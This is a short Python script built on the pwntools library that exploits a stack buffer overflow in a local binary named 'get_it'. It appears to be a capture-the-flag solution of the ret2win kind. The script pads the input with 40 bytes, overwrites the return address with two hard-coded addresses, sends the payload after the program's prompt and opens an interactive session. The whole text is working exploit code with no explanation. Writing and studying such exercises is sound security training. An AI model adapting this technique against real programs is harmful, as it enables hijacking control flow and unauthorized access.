from pwn import *
pay = b""
pay += b"A"*40
pay += p64(0x400451)
pay += p64(0x4005b6)
p = process("./get_it")
p.recvuntil(b"Do you gets it??")
p.sendline(pay)
p.interactive()
